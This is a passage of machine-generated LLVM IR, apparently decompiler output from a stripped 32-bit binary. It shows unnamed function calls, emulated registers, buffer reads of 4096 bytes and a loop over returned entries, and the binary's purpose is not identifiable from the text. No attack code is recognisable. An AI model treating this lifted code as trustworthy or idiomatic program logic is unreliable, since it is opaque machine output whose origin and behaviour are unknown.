  %v2_804e21c = inttoptr i32 %v1_804e21c to i32*
  store i32 0, i32* %v2_804e21c, align 4
  %v2_804e21e = inttoptr i32 %v0_804e1f6 to i32*
  store i32 6, i32* %v2_804e21e, align 4
  %v3_804e220 = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804e220, i32* %eax.global-to-local, align 4
  %v0_804e225 = load i32, i32* @esp, align 4
  %v1_804e225 = inttoptr i32 %v0_804e225 to i32*
  %v3_804e225 = add i32 %v0_804e225, 4
  %v1_804e226 = inttoptr i32 %v3_804e225 to i32*
  store i32 %v3_804e220, i32* %v1_804e226, align 4
  %v1_804e228 = add i32 %v0_804e225, 4139
  store i32 %v1_804e228, i32* %eax.global-to-local, align 4
  store i32 %v1_804e228, i32* %v1_804e225, align 4
  %v3_804e230 = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e230, i32* %eax.global-to-local, align 4
  %v0_804e235 = load i32, i32* @esp, align 4
  %v1_804e235 = inttoptr i32 %v0_804e235 to i32*
  %v2_804e235 = load i32, i32* %v1_804e235, align 4
  store i32 %v2_804e235, i32* @ebx, align 4
  %v1_804e236 = add i32 %v0_804e235, 4139
  store i32 %v1_804e236, i32* %edx.global-to-local, align 4
  store i32 %v1_804e236, i32* %v1_804e235, align 4
  %v2_804e23e = call i32 @function_80525e0(i8* null)
  store i32 %v2_804e23e, i32* %eax.global-to-local, align 4
  %v0_804e243 = load i32, i32* @esp, align 4
  %v1_804e243 = inttoptr i32 %v0_804e243 to i32*
  %v2_804e243 = load i32, i32* %v1_804e243, align 4
  store i32 %v2_804e243, i32* %edx.global-to-local, align 4
  %v3_804e243 = add i32 %v0_804e243, 4
  %v1_804e244 = inttoptr i32 %v3_804e243 to i32*
  %v0_804e245 = load i32, i32* @edi, align 4
  store i32 %v0_804e245, i32* %v1_804e244, align 4
  %v1_804e246 = add i32 %v0_804e243, 4139
  store i32 %v1_804e246, i32* %edx.global-to-local, align 4
  %v2_804e24d = add i32 %v1_804e246, %v2_804e23e
  store i32 %v2_804e24d, i32* %eax.global-to-local, align 4
  store i32 %v2_804e24d, i32* %v1_804e243, align 4
  %v3_804e251 = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e251, i32* %eax.global-to-local, align 4
  %v0_804e256 = load i32, i32* @esp, align 4
  %v1_804e256 = inttoptr i32 %v0_804e256 to i32*
  %v2_804e256 = load i32, i32* %v1_804e256, align 4
  store i32 %v2_804e256, i32* @ebp, align 4
  %v3_804e256 = add i32 %v0_804e256, 4
  %v1_804e257 = inttoptr i32 %v3_804e256 to i32*
  %v2_804e257 = load i32, i32* %v1_804e257, align 4
  store i32 %v2_804e257, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804e257, align 4
  store i32 7, i32* %v1_804e256, align 4
  %v3_804e25c = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804e25c, i32* %eax.global-to-local, align 4
  %v0_804e261 = load i32, i32* @esp, align 4
  %v1_804e261 = inttoptr i32 %v0_804e261 to i32*
  %v2_804e261 = load i32, i32* %v1_804e261, align 4
  store i32 %v2_804e261, i32* @esi, align 4
  store i32 %v3_804e25c, i32* @ebx, align 4
  %v1_804e264 = add i32 %v0_804e261, 4139
  store i32 %v1_804e264, i32* %eax.global-to-local, align 4
  store i32 %v1_804e264, i32* %v1_804e261, align 4
  %v2_804e26c = call i32 @function_80525e0(i8* null)
  store i32 %v2_804e26c, i32* %eax.global-to-local, align 4
  %v0_804e271 = load i32, i32* @esp, align 4
  %v1_804e271 = inttoptr i32 %v0_804e271 to i32*
  %v2_804e271 = load i32, i32* %v1_804e271, align 4
  store i32 %v2_804e271, i32* %edx.global-to-local, align 4
  %v3_804e271 = add i32 %v0_804e271, 4
  %v1_804e272 = inttoptr i32 %v3_804e271 to i32*
  %v0_804e273 = load i32, i32* @ebx, align 4
  store i32 %v0_804e273, i32* %v1_804e272, align 4
  %v1_804e274 = add i32 %v0_804e271, 4139
  store i32 %v1_804e274, i32* %edx.global-to-local, align 4
  %v2_804e27b = add i32 %v1_804e274, %v2_804e26c
  store i32 %v2_804e27b, i32* %eax.global-to-local, align 4
  store i32 %v2_804e27b, i32* %v1_804e271, align 4
  %v3_804e27f = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804e284 = load i32, i32* @esp, align 4
  %v1_804e287 = add i32 %v0_804e284, 8
  %v2_804e287 = inttoptr i32 %v1_804e287 to i32*
  store i32 4096, i32* %v2_804e287, align 4
  %v1_804e28c = add i32 %v0_804e284, 43
  store i32 %v1_804e28c, i32* %eax.global-to-local, align 4
  %v2_804e290 = add i32 %v0_804e284, 4
  %v3_804e290 = inttoptr i32 %v2_804e290 to i32*
  store i32 %v1_804e28c, i32* %v3_804e290, align 4
  %v1_804e291 = add i32 %v0_804e284, 4139
  store i32 %v1_804e291, i32* %edx.global-to-local, align 4
  %v3_804e298 = inttoptr i32 %v0_804e284 to i32*
  store i32 %v1_804e291, i32* %v3_804e298, align 4
  %v4_804e299 = call i32 @function_8052d52(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e29e = load i32, i32* @esp, align 4
  %v1_804e29e = add i32 %v0_804e29e, 16
  %v1_804e2a1 = add i32 %v4_804e299, 1
  %v8_804e2a1 = icmp eq i32 %v1_804e2a1, 0
  store i32 %v1_804e2a1, i32* %eax.global-to-local, align 4
  br i1 %v8_804e2a1, label %dec_label_pc_804e1e9, label %dec_label_pc_804e2a8

dec_label_pc_804e2a8:                             ; preds = %dec_label_pc_804e21a
  %v2_804e2a8 = add i32 %v0_804e29e, 12
  %v3_804e2a8 = inttoptr i32 %v2_804e2a8 to i32*
  store i32 %v1_804e2a1, i32* %v3_804e2a8, align 4
  %v0_804e2a9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e2a9 = add i32 %v0_804e29e, 8
  %v3_804e2a9 = inttoptr i32 %v2_804e2a9 to i32*
  store i32 %v0_804e2a9, i32* %v3_804e2a9, align 4
  %v1_804e2aa = add i32 %v0_804e29e, 4
  %v2_804e2aa = inttoptr i32 %v1_804e2aa to i32*
  store i32 0, i32* %v2_804e2aa, align 4
  %v2_804e2ac = inttoptr i32 %v0_804e29e to i32*
  store i32 6, i32* %v2_804e2ac, align 4
  %v3_804e2ae = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804e2ae, i32* %eax.global-to-local, align 4
  %v0_804e2b3 = load i32, i32* @esp, align 4
  %v1_804e2b3 = inttoptr i32 %v0_804e2b3 to i32*
  %v3_804e2b3 = add i32 %v0_804e2b3, 4
  %v1_804e2b4 = inttoptr i32 %v3_804e2b3 to i32*
  store i32 %v3_804e2ae, i32* %v1_804e2b4, align 4
  %v1_804e2b6 = add i32 %v0_804e2b3, 4139
  store i32 %v1_804e2b6, i32* %eax.global-to-local, align 4
  store i32 %v1_804e2b6, i32* %v1_804e2b3, align 4
  %v3_804e2be = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e2be, i32* %eax.global-to-local, align 4
  %v0_804e2c3 = load i32, i32* @esp, align 4
  %v1_804e2c3 = inttoptr i32 %v0_804e2c3 to i32*
  %v2_804e2c3 = load i32, i32* %v1_804e2c3, align 4
  store i32 %v2_804e2c3, i32* @ebx, align 4
  %v1_804e2c4 = add i32 %v0_804e2c3, 4139
  store i32 %v1_804e2c4, i32* %edx.global-to-local, align 4
  store i32 %v1_804e2c4, i32* %v1_804e2c3, align 4
  %v2_804e2cc = call i32 @function_80525e0(i8* null)
  store i32 %v2_804e2cc, i32* %eax.global-to-local, align 4
  %v0_804e2d1 = load i32, i32* @esp, align 4
  %v1_804e2d1 = inttoptr i32 %v0_804e2d1 to i32*
  %v2_804e2d1 = load i32, i32* %v1_804e2d1, align 4
  store i32 %v2_804e2d1, i32* %edx.global-to-local, align 4
  %v3_804e2d1 = add i32 %v0_804e2d1, 4
  %v1_804e2d2 = inttoptr i32 %v3_804e2d1 to i32*
  %v0_804e2d3 = load i32, i32* @edi, align 4
  store i32 %v0_804e2d3, i32* %v1_804e2d2, align 4
  %v1_804e2d4 = add i32 %v0_804e2d1, 4139
  store i32 %v1_804e2d4, i32* %edx.global-to-local, align 4
  %v2_804e2db = add i32 %v1_804e2d4, %v2_804e2cc
  store i32 %v2_804e2db, i32* %eax.global-to-local, align 4
  store i32 %v2_804e2db, i32* %v1_804e2d1, align 4
  %v3_804e2df = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e2df, i32* %eax.global-to-local, align 4
  %v0_804e2e4 = load i32, i32* @esp, align 4
  %v1_804e2e4 = inttoptr i32 %v0_804e2e4 to i32*
  %v2_804e2e4 = load i32, i32* %v1_804e2e4, align 4
  store i32 %v2_804e2e4, i32* @ebp, align 4
  %v3_804e2e4 = add i32 %v0_804e2e4, 4
  %v1_804e2e5 = inttoptr i32 %v3_804e2e4 to i32*
  %v2_804e2e5 = load i32, i32* %v1_804e2e5, align 4
  store i32 %v2_804e2e5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804e2e5, align 4
  store i32 9, i32* %v1_804e2e4, align 4
  %v3_804e2ea = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804e2ea, i32* %eax.global-to-local, align 4
  %v0_804e2ef = load i32, i32* @esp, align 4
  %v1_804e2ef = inttoptr i32 %v0_804e2ef to i32*
  %v2_804e2ef = load i32, i32* %v1_804e2ef, align 4
  store i32 %v2_804e2ef, i32* @esi, align 4
  store i32 %v3_804e2ea, i32* @ebx, align 4
  %v1_804e2f2 = add i32 %v0_804e2ef, 4139
  store i32 %v1_804e2f2, i32* %eax.global-to-local, align 4
  store i32 %v1_804e2f2, i32* %v1_804e2ef, align 4
  %v2_804e2fa = call i32 @function_80525e0(i8* null)
  store i32 %v2_804e2fa, i32* %eax.global-to-local, align 4
  %v0_804e2ff = load i32, i32* @esp, align 4
  %v1_804e2ff = inttoptr i32 %v0_804e2ff to i32*
  %v2_804e2ff = load i32, i32* %v1_804e2ff, align 4
  store i32 %v2_804e2ff, i32* %edx.global-to-local, align 4
  %v3_804e2ff = add i32 %v0_804e2ff, 4
  %v1_804e300 = inttoptr i32 %v3_804e2ff to i32*
  %v0_804e301 = load i32, i32* @ebx, align 4
  store i32 %v0_804e301, i32* %v1_804e300, align 4
  %v1_804e302 = add i32 %v0_804e2ff, 4139
  store i32 %v1_804e302, i32* %edx.global-to-local, align 4
  %v2_804e309 = add i32 %v1_804e302, %v2_804e2fa
  store i32 %v2_804e309, i32* %eax.global-to-local, align 4
  store i32 %v2_804e309, i32* %v1_804e2ff, align 4
  %v3_804e30d = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804e312 = load i32, i32* @esp, align 4
  %v1_804e312 = inttoptr i32 %v0_804e312 to i32*
  %v1_804e313 = add i32 %v0_804e312, 4139
  store i32 %v1_804e313, i32* %eax.global-to-local, align 4
  store i32 %v1_804e313, i32* %v1_804e312, align 4
  %v1_804e31b = call i32 @function_8052f44(i32 0)
  store i32 %v1_804e31b, i32* %eax.global-to-local, align 4
  %v0_804e320 = load i32, i32* @esp, align 4
  %v1_804e320 = add i32 %v0_804e320, 16
  store i32 %v1_804e31b, i32* @ebp, align 4
  %v1_804e325 = icmp eq i32 %v1_804e31b, 0
  br i1 %v1_804e325, label %dec_label_pc_804e1e9, label %dec_label_pc_804e32d.preheader

dec_label_pc_804e32d.preheader:                   ; preds = %dec_label_pc_804e2a8
  %v3_804e33083 = inttoptr i32 %v0_804e320 to i32*
  store i32 %v1_804e31b, i32* %v3_804e33083, align 4
  %v0_804e33184 = call i32 @function_8053035()
  store i32 %v0_804e33184, i32* @eax, align 4
  %v0_804e33685 = load i32, i32* @esp, align 4
  store i32 %v0_804e33184, i32* @esi, align 4
  %v1_804e33b87 = icmp eq i32 %v0_804e33184, 0
  br i1 %v1_804e33b87, label %dec_label_pc_804e57e, label %dec_label_pc_804e343

dec_label_pc_804e343:                             ; preds = %dec_label_pc_804e32d.preheader, %dec_label_pc_804e32d.backedge
  %v0_804e33688 = phi i32 [ %v0_804e336, %dec_label_pc_804e32d.backedge ], [ %v0_804e33685, %dec_label_pc_804e32d.preheader ]
  %v1_804e343 = add i32 %v0_804e33688, 20
  %v2_804e343 = inttoptr i32 %v1_804e343 to i32*
  %v3_804e343 = load i32, i32* %v2_804e343, align 4
  store i32 %v3_804e343, i32* @eax, align 4
  %v1_804e347 = icmp eq i32 %v3_804e343, 0
  %v1_804e349 = icmp eq i1 %v1_804e347, false
  br i1 %v1_804e349, label %dec_label_pc_804e57e, label %dec_label_pc_804e34f

dec_label_pc_804e34f:                             ; preds = %dec_label_pc_804e343
  %v2_804e34f = add i32 %v0_804e33688, 12
  %v3_804e34f = inttoptr i32 %v2_804e34f to i32*
  store i32 %v3_804e343, i32* %v3_804e34f, align 4
  %v2_804e350 = add i32 %v0_804e33688, 8
  %v3_804e350 = inttoptr i32 %v2_804e350 to i32*
  store i32 %v3_804e343, i32* %v3_804e350, align 4
  %v1_804e351 = add i32 %v0_804e33688, 4
  %v2_804e351 = inttoptr i32 %v1_804e351 to i32*
  store i32 4096, i32* %v2_804e351, align 4
  %v1_804e356 = add i32 %v0_804e33688, 43
  store i32 %v1_804e356, i32* %edx.global-to-local, align 4
  %v3_804e35a = inttoptr i32 %v0_804e33688 to i32*
  store i32 %v1_804e356, i32* %v3_804e35a, align 4
  %v2_804e35b = call i32 @function_8052670(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804e35b, i32* %eax.global-to-local, align 4
  %v0_804e360 = load i32, i32* @esp, align 4
  %v1_804e360 = inttoptr i32 %v0_804e360 to i32*
  %v2_804e360 = load i32, i32* %v1_804e360, align 4
  store i32 %v2_804e360, i32* @ebx, align 4
  %v3_804e360 = add i32 %v0_804e360, 4
  %v1_804e361 = inttoptr i32 %v3_804e360 to i32*
  %v2_804e361 = load i32, i32* %v1_804e361, align 4
  store i32 %v2_804e361, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804e361, align 4
  store i32 6, i32* %v1_804e360, align 4
  %v3_804e366 = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804e366, i32* %eax.global-to-local, align 4
  %v0_804e36b = load i32, i32* @esp, align 4
  %v1_804e36b = inttoptr i32 %v0_804e36b to i32*
  %v2_804e36b = load i32, i32* %v1_804e36b, align 4
  store i32 %v2_804e36b, i32* %edx.global-to-local, align 4
  %v3_804e36b = add i32 %v0_804e36b, 4
  %v1_804e36c = inttoptr i32 %v3_804e36b to i32*
  store i32 %v3_804e366, i32* %v1_804e36c, align 4
  %v1_804e36e = add i32 %v0_804e36b, 4139
  store i32 %v1_804e36e, i32* %eax.global-to-local, align 4
  store i32 %v1_804e36e, i32* %v1_804e36b, align 4
  %v3_804e376 = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e376, i32* %eax.global-to-local, align 4
  %v0_804e37b = load i32, i32* @esp, align 4
  %v1_804e37b = inttoptr i32 %v0_804e37b to i32*
  %v2_804e37b = load i32, i32* %v1_804e37b, align 4
  store i32 %v2_804e37b, i32* %eax.global-to-local, align 4
  %v1_804e37c = add i32 %v0_804e37b, 4139
  store i32 %v1_804e37c, i32* %edx.global-to-local, align 4
  store i32 %v1_804e37c, i32* %v1_804e37b, align 4
  %v2_804e384 = call i32 @function_80525e0(i8* null)
  store i32 %v2_804e384, i32* %eax.global-to-local, align 4
  %v0_804e389 = load i32, i32* @esp, align 4
  %v1_804e389 = inttoptr i32 %v0_804e389 to i32*
  %v3_804e389 = add i32 %v0_804e389, 4
  %v1_804e38a = inttoptr i32 %v3_804e389 to i32*
  %v2_804e38a = load i32, i32* %v1_804e38a, align 4
  store i32 %v2_804e38a, i32* @ebx, align 4
  %v0_804e38b = load i32, i32* @edi, align 4
  store i32 %v0_804e38b, i32* %v1_804e38a, align 4
  %v1_804e38c = add i32 %v0_804e389, 4139
  store i32 %v1_804e38c, i32* %edx.global-to-local, align 4
  %v2_804e393 = add i32 %v1_804e38c, %v2_804e384
  store i32 %v2_804e393, i32* %eax.global-to-local, align 4
  store i32 %v2_804e393, i32* %v1_804e389, align 4
  %v3_804e397 = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e397, i32* %eax.global-to-local, align 4
  %v0_804e39c = load i32, i32* @esp, align 4
  %v1_804e39c = inttoptr i32 %v0_804e39c to i32*
  %v2_804e39c = load i32, i32* %v1_804e39c, align 4
  store i32 %v2_804e39c, i32* %eax.global-to-local, align 4
  %v3_804e39c = add i32 %v0_804e39c, 4
  %v1_804e39d = inttoptr i32 %v3_804e39c to i32*
  %v2_804e39d = load i32, i32* %v1_804e39d, align 4
  store i32 %v2_804e39d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804e39d, align 4
  store i32 9, i32* %v1_804e39c, align 4
  %v3_804e3a2 = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804e3a2, i32* @ebx, align 4
  %v0_804e3a9 = load i32, i32* @esp, align 4
  %v1_804e3a9 = inttoptr i32 %v0_804e3a9 to i32*
  %v1_804e3aa = add i32 %v0_804e3a9, 4139
  store i32 %v1_804e3aa, i32* %eax.global-to-local, align 4
  store i32 %v1_804e3aa, i32* %v1_804e3a9, align 4
  %v2_804e3b2 = call i32 @function_80525e0(i8* null)
  store i32 %v2_804e3b2, i32* %eax.global-to-local, align 4
  %v0_804e3b7 = load i32, i32* @esp, align 4
  %v1_804e3b7 = inttoptr i32 %v0_804e3b7 to i32*
  %v2_804e3b7 = load i32, i32* %v1_804e3b7, align 4
  store i32 %v2_804e3b7, i32* %edx.global-to-local, align 4
  %v3_804e3b7 = add i32 %v0_804e3b7, 4
  %v1_804e3b8 = inttoptr i32 %v3_804e3b7 to i32*
  %v0_804e3b9 = load i32, i32* @ebx, align 4
  store i32 %v0_804e3b9, i32* %v1_804e3b8, align 4
  %v1_804e3ba = add i32 %v0_804e3b7, 4139
  store i32 %v1_804e3ba, i32* %edx.global-to-local, align 4
  %v2_804e3c1 = add i32 %v1_804e3ba, %v2_804e3b2
  store i32 %v2_804e3c1, i32* %eax.global-to-local, align 4
  store i32 %v2_804e3c1, i32* %v1_804e3b7, align 4
  %v3_804e3c5 = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e3c5, i32* %eax.global-to-local, align 4
  %v0_804e3ca = load i32, i32* @esp, align 4
  %v1_804e3ca = inttoptr i32 %v0_804e3ca to i32*
  %v2_804e3ca = load i32, i32* %v1_804e3ca, align 4
  store i32 %v2_804e3ca, i32* @ebx, align 4
  %v1_804e3cb = add i32 %v0_804e3ca, 4139
  store i32 %v1_804e3cb, i32* %eax.global-to-local, align 4
  store i32 %v1_804e3cb, i32* %v1_804e3ca, align 4
  %v2_804e3d3 = call i32 @function_80525e0(i8* null)
  store i32 %v2_804e3d3, i32* %eax.global-to-local, align 4
  %v0_804e3d8 = load i32, i32* @esp, align 4
  %v1_804e3d8 = inttoptr i32 %v0_804e3d8 to i32*
  %v2_804e3d8 = load i32, i32* %v1_804e3d8, align 4
  store i32 %v2_804e3d8, i32* %edx.global-to-local, align 4
  %v3_804e3d8 = add i32 %v0_804e3d8, 4
  %v1_804e3d9 = inttoptr i32 %v3_804e3d8 to i32*
  store i32 ptrtoint (i32* @global_var_805546d.6 to i32), i32* %v1_804e3d9, align 4
  %v1_804e3df = add i32 %v0_804e3d8, 4139
  store i32 %v1_804e3df, i32* %edx.global-to-local, align 4
  %v2_804e3e6 = add i32 %v1_804e3df, %v2_804e3d3
  store i32 %v2_804e3e6, i32* %eax.global-to-local, align 4
  store i32 %v2_804e3e6, i32* %v1_804e3d8, align 4
  %v3_804e3ea = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e3ea, i32* %eax.global-to-local, align 4
  %v0_804e3ef = load i32, i32* @esp, align 4
  %v1_804e3ef = inttoptr i32 %v0_804e3ef to i32*
  %v2_804e3ef = load i32, i32* %v1_804e3ef, align 4
  store i32 %v2_804e3ef, i32* @ebx, align 4
  %v1_804e3f0 = add i32 %v0_804e3ef, 4139
  store i32 %v1_804e3f0, i32* %eax.global-to-local, align 4
  store i32 %v1_804e3f0, i32* %v1_804e3ef, align 4
  %v2_804e3f8 = call i32 @function_80525e0(i8* null)
  store i32 %v2_804e3f8, i32* %eax.global-to-local, align 4
  %v0_804e3fd = load i32, i32* @esp, align 4
  %v1_804e3fd = inttoptr i32 %v0_804e3fd to i32*
  %v3_804e3fd = add i32 %v0_804e3fd, 4
  %v0_804e3fe = load i32, i32* @esi, align 4
  %v1_804e3fe = add i32 %v0_804e3fe, 11
  store i32 %v1_804e3fe, i32* %edx.global-to-local, align 4
  %v1_804e401 = inttoptr i32 %v3_804e3fd to i32*
  store i32 %v1_804e3fe, i32* %v1_804e401, align 4
  %v1_804e403 = add i32 %v0_804e3fd, 4139
  store i32 %v1_804e403, i32* %edx.global-to-local, align 4
  %v2_804e40a = add i32 %v1_804e403, %v2_804e3f8
  store i32 %v2_804e40a, i32* %eax.global-to-local, align 4
  store i32 %v2_804e40a, i32* %v1_804e3fd, align 4
  %v3_804e40e = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804e413 = load i32, i32* @esp, align 4
  %v1_804e416 = add i32 %v0_804e413, 8
  %v2_804e416 = inttoptr i32 %v1_804e416 to i32*
  store i32 4096, i32* %v2_804e416, align 4
  %v1_804e41b = add i32 %v0_804e413, 43
  store i32 %v1_804e41b, i32* %eax.global-to-local, align 4
  %v2_804e41f = add i32 %v0_804e413, 4
  %v3_804e41f = inttoptr i32 %v2_804e41f to i32*
  store i32 %v1_804e41b, i32* %v3_804e41f, align 4
  %v1_804e420 = add i32 %v0_804e413, 4139
  store i32 %v1_804e420, i32* %edx.global-to-local, align 4
  %v3_804e427 = inttoptr i32 %v0_804e413 to i32*
  store i32 %v1_804e420, i32* %v3_804e427, align 4
  %v4_804e428 = call i32 @function_8052d52(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e42d = load i32, i32* @esp, align 4
  %v1_804e430 = add i32 %v4_804e428, 1
  %v8_804e430 = icmp eq i32 %v1_804e430, 0
  store i32 %v1_804e430, i32* %eax.global-to-local, align 4
  br i1 %v8_804e430, label %dec_label_pc_804e32d.backedge, label %dec_label_pc_804e437

dec_label_pc_804e437:                             ; preds = %dec_label_pc_804e34f
  %v1_804e43a = add i32 %v0_804e42d, 43
  store i32 %v1_804e43a, i32* %eax.global-to-local, align 4
  %v3_804e43e = inttoptr i32 %v0_804e42d to i32*
  store i32 %v1_804e43a, i32* %v3_804e43e, align 4
  %v2_804e43f = call i32 @function_80525e0(i8* null)
  %v0_804e444 = load i32, i32* @esp, align 4
  %v1_804e447 = add i32 %v0_804e444, 8764
  store i32 %v1_804e447, i32* @edx, align 4
  %v2_804e44e = add i32 %v0_804e444, 8
  %v3_804e44e = inttoptr i32 %v2_804e44e to i32*
  store i32 %v1_804e447, i32* %v3_804e44e, align 4
  %v2_804e44f = add i32 %v0_804e444, 4
  %v3_804e44f = inttoptr i32 %v2_804e44f to i32*
  store i32 %v2_804e43f, i32* %v3_804e44f, align 4
  %v1_804e450 = add i32 %v0_804e444, 43
  store i32 %v1_804e450, i32* %eax.global-to-local, align 4
  %v3_804e454 = inttoptr i32 %v0_804e444 to i32*
  store i32 %v1_804e450, i32* %v3_804e454, align 4
  %v4_804e455 = call i32 @function_80528d0(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e45a = load i32, i32* @esp, align 4
  %v1_804e45d = add i32 %v4_804e455, 1
  %v8_804e45d = icmp eq i32 %v1_804e45d, 0
  store i32 %v1_804e45d, i32* %eax.global-to-local, align 4
  br i1 %v8_804e45d, label %dec_label_pc_804e32d.backedge, label %dec_label_pc_804e464

dec_label_pc_804e464:                             ; preds = %dec_label_pc_804e437
  %v0_804e464 = load i32, i32* @ebx, align 4
  %v2_804e464 = add i32 %v0_804e45a, 12
  %v3_804e464 = inttoptr i32 %v2_804e464 to i32*
  store i32 %v0_804e464, i32* %v3_804e464, align 4
  %v0_804e465 = load i32, i32* @ebx, align 4
  %v2_804e465 = add i32 %v0_804e45a, 8
  %v3_804e465 = inttoptr i32 %v2_804e465 to i32*
  store i32 %v0_804e465, i32* %v3_804e465, align 4
  %v1_804e466 = add i32 %v0_804e45a, 4
  %v2_804e466 = inttoptr i32 %v1_804e466 to i32*
  store i32 10, i32* %v2_804e466, align 4
  %v0_804e468 = load i32, i32* @edi, align 4
  %v3_804e468 = inttoptr i32 %v0_804e45a to i32*
  store i32 %v0_804e468, i32* %v3_804e468, align 4
  %v3_804e469 = call i32 @function_80526e0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e469, i32* %eax.global-to-local, align 4
  %v0_804e46e = load i32, i32* @esp, align 4
  %v1_804e46e = inttoptr i32 %v0_804e46e to i32*
  %v2_804e46e = load i32, i32* %v1_804e46e, align 4
  store i32 %v2_804e46e, i32* %edx.global-to-local, align 4
  %v3_804e46e = add i32 %v0_804e46e, 4
  %v1_804e46f = inttoptr i32 %v3_804e46e to i32*
  store i32 9, i32* %v1_804e46f, align 4
  store i32 %v3_804e469, i32* %v1_804e46e, align 4
  %v4_804e473 = call i32 @function_8052c60(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e473, i32* %eax.global-to-local, align 4
  %v0_804e478 = load i32, i32* @esp, align 4
  %v1_804e478 = add i32 %v0_804e478, 20
  %v2_804e478 = inttoptr i32 %v1_804e478 to i32*
  store i32 1, i32* %v2_804e478, align 4
  %v0_804e480 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e32d.backedge

dec_label_pc_804e32d.backedge:                    ; preds = %dec_label_pc_804e464, %dec_label_pc_804e34f, %dec_label_pc_804e437
  %v0_804e32d42.in = phi i32 [ %v0_804e480, %dec_label_pc_804e464 ], [ %v0_804e42d, %dec_label_pc_804e34f ], [ %v0_804e45a, %dec_label_pc_804e437 ]
  %v0_804e330.pre = load i32, i32* @ebp, align 4
  %v3_804e330 = inttoptr i32 %v0_804e32d42.in to i32*
  store i32 %v0_804e330.pre, i32* %v3_804e330, align 4
  %v0_804e331 = call i32 @function_8053035()
  store i32 %v0_804e331, i32* @eax, align 4
  %v0_804e336 = load i32, i32* @esp, align 4
  store i32 %v0_804e331, i32* @esi, align 4
  %v1_804e33b = icmp eq i32 %v0_804e331, 0
  br i1 %v1_804e33b, label %dec_label_pc_804e57e, label %dec_label_pc_804e343

dec_label_pc_804e488:                             ; preds = %dec_label_pc_804e12b
  %v1_804e488 = add i32 %v0_804e488, 1
  store i32 %v1_804e488, i32* @esi, align 4
  %v9_804e489 = icmp eq i32 %v0_804e488, 0
  %v1_804e48c = icmp eq i1 %v9_804e489, false
  br i1 %v1_804e48c, label %dec_label_pc_804e133, label %dec_label_pc_804e492

dec_label_pc_804e492:                             ; preds = %dec_label_pc_804e488
  %v1_804e492 = add i32 %v0_804e135, 3
  %v2_804e492 = inttoptr i32 %v1_804e492 to i8*
  %v3_804e492 = load i8, i8* %v2_804e492, align 1
  %v12_804e492 = icmp eq i8 %v3_804e492, 65
  %.stack_var_-8769.1 = select i1 %v12_804e492, i8 1, i8 %stack_var_-8769.1.ph
  %v1_804e498 = add i32 %v0_804e135, 1
  store i32 %v1_804e498, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e113.outer

dec_label_pc_804e4a0:                             ; preds = %dec_label_pc_804e123, %dec_label_pc_804e11b
  %v1_804e4a0 = and i32 %v0_804e4a0, -256
  %v2_804e4a0 = or i32 %v1_804e4a0, 1
  br label %dec_label_pc_804e135

dec_label_pc_804e4a7:                             ; preds = %dec_label_pc_804e08b, %dec_label_pc_804e07c
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e0a1

dec_label_pc_804e4b7:                             ; preds = %dec_label_pc_804e19b
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804e4be = call i32 @function_8051c10(i8 6)
  store i32 %v3_804e4be, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804e4ca = call i32 @function_8051c10(i8 7)
  store i32 %v3_804e4ca, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804e4d6 = call i32 @function_8051c10(i8 9)
  store i32 %v3_804e4d6, i32* %eax.global-to-local, align 4
  %v2_804e4e6.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804e4de

dec_label_pc_804e4de:                             ; preds = %dec_label_pc_804e024, %dec_label_pc_804e4b7
  %v2_804e4e6 = phi i32 [ %v0_804df73, %dec_label_pc_804e024 ], [ %v2_804e4e6.pre, %dec_label_pc_804e4b7 ]
  %v0_804e4e4 = load i32, i32* @ebx, align 4
  store i32 %v0_804e4e4, i32* %eax.global-to-local, align 4
  store i32 %v2_804e4e6, i32* @ebx, align 4
  store i32 %v0_804df72, i32* @esi, align 4
  store i32 %v0_804df71, i32* @edi, align 4
  store i32 %v0_804df70, i32* @ebp, align 4
